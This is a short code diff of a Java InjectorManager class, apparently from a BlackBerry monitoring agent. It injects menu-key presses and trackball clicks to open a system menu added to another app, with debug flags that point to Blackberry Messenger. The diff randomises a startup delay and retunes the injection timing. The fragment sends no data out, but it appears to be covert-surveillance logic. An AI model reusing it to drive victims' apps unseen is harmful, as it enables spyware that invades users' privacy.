@@ -240,7 +240,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
         unLock();
 
-        Utils.sleep(5000);
+        Utils.sleep(Utils.randomInt(5, 10) * 1000);
 
         if (requestForeground(name)) {
             //#ifdef DEBUG
@@ -266,6 +266,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
                 }
 
                 addSystemMenu(injector);
+
                 Utils.sleep(300);
                 callSystemMenu();
                 Utils.sleep(300);
@@ -317,29 +318,37 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
         debug.trace("callSystemMenu");
         //#endif
 
+        int waitTime = 300;
+
         //#ifdef BBM_DEBUG
         Status.self().setBacklight(true);
+        Utils.sleep(waitTime);
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(500);
+        
+        /*if(injector.isLastTry()){
+            KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
+        }*/
+        
+        Utils.sleep(waitTime);       
 
+        KeyInjector.trackBallRaw(20, true);
         if (Device.getInstance().atLeast(7, 0)) {
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version 7, track ball up");
             //#endif
-            KeyInjector.trackBallRaw(20, true);
+
         } else {
             //#ifdef DEBUG
             debug.trace("callMenuByKey, version <7, pressing menu: " + menu);
             //#endif
-            KeyInjector.trackBallRaw(20, true);
             KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
         }
 
-        Utils.sleep(500);
+        Utils.sleep(waitTime);
         KeyInjector.trackBallRawClick();
-        Utils.sleep(500);
+        Utils.sleep(waitTime);
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
 
     }
